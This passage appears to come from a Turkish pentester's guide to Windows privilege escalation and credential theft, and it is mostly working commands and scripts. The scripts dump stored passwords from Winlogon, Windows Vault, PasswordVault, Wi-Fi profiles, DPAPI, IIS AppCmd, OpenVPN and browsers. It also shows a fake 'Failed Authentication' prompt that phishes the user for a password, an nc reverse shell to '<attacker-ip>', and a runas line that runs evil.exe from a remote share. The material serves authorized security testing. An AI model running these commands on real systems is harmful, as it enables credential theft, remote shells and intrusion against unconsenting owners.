Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Açık Portlar

Dışarıdan **kısıtlanmış hizmetleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Güvenlik Duvarı Kuralları

[**Güvenlik Duvarı ile ilgili komutlar için bu sayfaya göz atın**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

[Ağ numaralandırması için daha fazla komut burada](../basic-cmd-for-pentesters.md#network)

### Windows için Linux Alt Sistemi (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` konumunda bulunabilir.

root user elde ederseniz herhangi bir portu dinleyebilirsiniz (`nc.exe` ile bir portu dinlemek için ilk kez kullandığınızda, GUI üzerinden `nc` uygulamasına firewall tarafından izin verilip verilmeyeceğini sorar).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Bash'i root olarak kolayca başlatmak için `--default-user root` seçeneğini deneyebilirsiniz.

`WSL` dosya sistemini `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` klasöründe inceleyebilirsiniz.

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credential Manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault, **Windows**'in kullanıcıların **otomatik olarak oturum açmasını** sağlamak için kullanabileceği sunuculara, web sitelerine ve diğer programlara ait kimlik bilgilerini depolar. İlk başta bu, kullanıcıların Facebook, Twitter veya Gmail gibi sitelerin kimlik bilgilerini depolayabileceği ve tarayıcıların otomatik olarak oturum açabileceği anlamına geliyormuş gibi görünebilir; ancak çalışma şekli bu değildir.

Windows Vault, Windows'in kullanıcıları otomatik olarak oturum açtırabileceği kimlik bilgilerini depolar. Bu, **bir kaynağa erişmek için kimlik bilgilerine ihtiyaç duyan herhangi bir Windows uygulamasının** (sunucu veya web sitesi) **bu Credential Manager** ve Windows Vault'u kullanabileceği ve kullanıcıların her seferinde kullanıcı adı ile parolayı girmesi yerine sağlanan kimlik bilgilerini kullanabileceği anlamına gelir.

Uygulamalar Credential Manager ile etkileşime girmediği sürece, belirli bir kaynağa ait kimlik bilgilerini kullanmalarının mümkün olduğunu düşünmüyorum. Bu nedenle uygulamanız vault'tan yararlanmak istiyorsa, bir şekilde **credential manager ile iletişim kurmalı ve bu kaynak için kimlik bilgilerini** varsayılan depolama vault'undan istemelidir.

Makinede depolanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Ardından, kayıtlı kimlik bilgilerini kullanmak için `runas` komutunu `/savecred` seçenekleriyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB share üzerinden uzak bir binary çağırmaktadır.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Sağlanan kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) veya [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1) aracılığıyla.

### UWP PasswordVault / Credential Locker

Modern Windows UWP uygulamaları, Microsoft Edge ve modern sistem hizmetleri; kimlik doğrulama belirteçlerini ve düz metin parolaları Evrensel Windows Platformu (UWP) `PasswordVault` içinde depolar (`vaultcmd` içinde `Web Credentials` olarak da gösterilir). Bu depolama alanı oturumdan izole edilmiştir ve yönetici veya `SeDebugPrivilege` yetkileri olmadan yerel olarak çözülebilir.

Depolanan tüm kullanıcı adlarını ve düz metin parolalarını anında dökmek ve şifrelerini çözmek için bu PowerShell komutunu kullanıcının etkin oturumu içinde çalıştırın:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)**, verilerin simetrik şifrelenmesi için bir yöntem sağlar ve ağırlıklı olarak Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelenmesinde kullanılır. Bu şifreleme, entropiye önemli ölçüde katkıda bulunmak için bir kullanıcı veya sistem sırrından yararlanır.

**DPAPI, anahtarların kullanıcının oturum açma sırlarından türetilen bir simetrik anahtar aracılığıyla şifrelenmesini sağlar**. Sistem şifrelemesi söz konusu olduğunda, sistemin domain kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenen kullanıcı RSA anahtarları, `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) değerini temsil edecek şekilde `%APPDATA%\Microsoft\Protect\{SID}` dizininde depolanır. **Aynı dosyada kullanıcının özel anahtarlarını koruyan master key ile birlikte bulunan DPAPI key**, genellikle 64 byte rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu ve içeriğinin CMD'deki `dir` komutuyla listelenemediğini, ancak PowerShell üzerinden listelenebildiğini unutmayın.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Uygun argümanlarla (`/pvk` veya `/rpc`) şifresini çözmek için **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**Ana parola tarafından korunan kimlik bilgileri dosyaları** genellikle şu konumda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uygun `/masterkey` ile **mimikatz module** `dpapi::cred` kullanarak şifre çözebilirsiniz.\
`sekurlsa::dpapi` module ile **memory** üzerinden birçok DPAPI **masterkey** **extract** edebilirsiniz (root iseniz).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials**, şifrelenmiş kimlik bilgilerini uygun şekilde depolamak amacıyla **scripting** ve otomasyon görevlerinde sıklıkla kullanılır. Kimlik bilgileri **DPAPI** kullanılarak korunur; bu genellikle yalnızca oluşturuldukları aynı bilgisayarda aynı kullanıcı tarafından şifrelerinin çözülebileceği anlamına gelir.

Bir dosyadaki PS credentials'ın şifresini çözmek için şunları yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wi-Fi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Kaydedilmiş RDP Bağlantıları

Bunları `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\` içinde bulabilirsiniz.

### Yakın Zamanda Çalıştırılan Komutlar
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgisi Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Herhangi bir `.rdg` dosyasını **decrypt etmek** için uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` module’ünü kullanın\
**Mimikatz** `sekurlsa::dpapi` module’ü ile bellekten **birçok DPAPI masterkey’i extract edebilirsiniz**

### Sticky Notes

Kullanıcılar Windows workstation’larında **password’leri** ve diğer bilgileri kaydetmek için sıklıkla Sticky Notes uygulamasını kullanır; bunun bir database file olduğunun farkında değildir. Bu file `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**AppCmd.exe’den password’leri recover etmek için Administrator olmanız ve High Integrity level altında çalışmanız gerektiğini unutmayın.**\
**AppCmd.exe**, `%systemroot%\system32\inetsrv\` directory’sinde bulunur.\
Bu file mevcutsa bazı **credentials**’ların yapılandırılmış ve **recover edilebilir** olması mümkündür.

Bu code [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) içinden extract edilmiştir:
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının mevcut olup olmadığını kontrol edin .\
Yükleyiciler **SYSTEM ayrıcalıklarıyla çalıştırılır**, çoğu **DLL Sideloading (bilgi kaynağı** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Registry (Kimlik Bilgileri)

### Putty Kimlik Bilgileri
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Sunucu Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### Kayıt defterindeki SSH anahtarları

SSH private keys `HKCU\Software\OpenSSH\Agent\Keys` registry key'inin içinde saklanabilir; bu nedenle burada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Bu yolun içinde herhangi bir kayıt bulursanız, bu muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca çözülebilir.\
Bu teknik hakkında daha fazla bilgi için: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` service çalışmıyorsa ve açılışta otomatik olarak başlamasını istiyorsanız şunu çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı SSH anahtarları oluşturmayı, bunları `ssh-add` ile eklemeyi ve SSH üzerinden bir makineye giriş yapmayı denedim. HKCU\Software\OpenSSH\Agent\Keys kayıt defteri anahtarı mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Katılımsız dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** adlı bir dosya arayın.

### Cached GPP Password

Daha önce, Group Policy Preferences (GPP) aracılığıyla bir grup makineye özel yerel yönetici hesaplarının dağıtılmasına olanak tanıyan bir özellik mevcuttu. Ancak bu yöntemin ciddi güvenlik açıkları vardı. İlk olarak, SYSVOL içinde XML dosyaları olarak depolanan Group Policy Objects (GPOs), herhangi bir domain kullanıcısı tarafından erişilebilir durumdaydı. İkinci olarak, bu GPP'lerde bulunan ve herkese açık şekilde belgelenmiş varsayılan bir anahtar kullanılarak AES256 ile şifrelenen parolaların şifresi, kimliği doğrulanmış herhangi bir kullanıcı tarafından çözülebiliyordu. Bu durum ciddi bir risk oluşturuyordu; çünkü kullanıcıların yükseltilmiş ayrıcalıklar elde etmesine olanak sağlayabilirdi.

Bu riski azaltmak amacıyla, yerel olarak önbelleğe alınmış ve boş olmayan bir `"cpassword"` alanı içeren GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda işlev, parolanın şifresini çözer ve özel bir PowerShell nesnesi döndürür. Bu nesne, GPP ve dosyanın konumu hakkında ayrıntılar içerir ve bu güvenlik açığının belirlenmesine ve giderilmesine yardımcı olur.

`C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista öncesi)_ içinde şu dosyaları arayın:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'ın şifresini çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
Parolaları almak için crackmapexec kullanımı:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Yapılandırması
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Loglar
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### Kimlik bilgilerini isteyin

Kullanıcının bunları bilebileceğini düşünüyorsanız, her zaman **kullanıcıdan kendi kimlik bilgilerini veya farklı bir kullanıcının kimlik bilgilerini girmesini isteyebilirsiniz** (istemciden doğrudan **kimlik bilgilerini** istemenin gerçekten **riskli** olduğunu unutmayın):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **Kimlik bilgilerini içerebilecek olası dosya adları**

Geçmişte **parolalar**ı **açık metin** veya **Base64** biçiminde içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Önerilen tüm dosyalarda arama yapın:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Geri Dönüşüm Kutusu'ndaki Kimlik Bilgileri

Kimlik bilgilerini bulmak için Çöp Kutusu'nu da kontrol etmelisiniz.

Çeşitli programlar tarafından kaydedilmiş **parolaları kurtarmak** için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt defterinin içinde

**Kimlik bilgileri içerebilecek diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Registry'den openssh anahtarlarını çıkarma.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

**Chrome veya Firefox** parolalarının depolandığı veritabanlarını kontrol etmelisiniz.\
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini de kontrol edin; bazı **parolalar** burada depolanıyor olabilir.

Tarayıcılardan parola çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, farklı dillerdeki yazılım bileşenleri arasında **iletişime** izin veren, Windows işletim sisteminde yerleşik bir teknolojidir. Her COM bileşeni bir **class ID (CLSID)** aracılığıyla **tanımlanır** ve her bileşen, interface ID'leri (IID'ler) ile tanımlanan bir veya daha fazla arayüz aracılığıyla işlevsellik sunar.

COM sınıfları ve arayüzleri sırasıyla kayıt defterinde **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu kayıt defteri, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek **HKEY\CLASSES\ROOT** oluşturulur.

Bu kayıt defterinin CLSID'leri içinde, bir **DLL** dosyasına işaret eden bir **varsayılan değer** ve **ThreadingModel** adlı bir değer içeren alt kayıt defteri **InProcServer32** bulunabilir. **ThreadingModel** değeri **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single veya Multi) ya da **Neutral** (Thread Neutral) olabilir.

![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterinin CLSID'leri içinde, bir DLL dosyasına işaret eden bir varsayılan değer ve bir değer içeren alt kayıt defteri InProcServer32 bulunabilir...](<../../images/image (729).png>)

Temel olarak, yürütülecek **DLL'lerden** herhangi birinin üzerine yazabiliyorsanız ve bu DLL farklı bir kullanıcı tarafından yürütülecekse, **yetki yükseltebilirsiniz**.

Saldırganların COM Hijacking'i bir persistence mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde Generic Password araması**

**Dosya içeriklerini arayın**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adıyla dosya arama**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt defterinde anahtar adlarını ve parolaları arayın**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** eklentisidir; bu eklentiyi, kurbanın içinde kimlik bilgilerini arayan her metasploit POST module'ünü **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada belirtilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan başka bir harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu verileri açık metin olarak kaydeden çeşitli araçların (**PuTTY**, **WinSCP**, **FileZilla**, **SuperPuTTY** ve **RDP**) **oturumlarını**, **kullanıcı adlarını** ve **parolalarını** arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM olarak çalışan bir process'in full access ile yeni bir process açtığını** (`OpenProcess()`) hayal edin. Aynı process ayrıca **düşük yetkilerle, ana process'in tüm açık handle'larını miras alan yeni bir process oluşturuyor** (`CreateProcess()`).\
Ardından, **düşük yetkili process'e full access'iniz varsa**, `OpenProcess()` ile oluşturulan **privileged process'e ait açık handle'ı ele geçirip** bir **shellcode inject** edebilirsiniz.\
**Bu zafiyeti nasıl tespit edip exploit edeceğinize** dair daha fazla bilgi için [bu örneği okuyun.](leaked-handle-exploitation.md)\
**Farklı permission seviyeleriyle miras alınan process ve thread'lere ait daha fazla açık handle'ın (yalnızca full access değil) nasıl test edilip abuse edileceğine dair daha kapsamlı açıklama** için [**bu diğer yazıyı okuyun**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

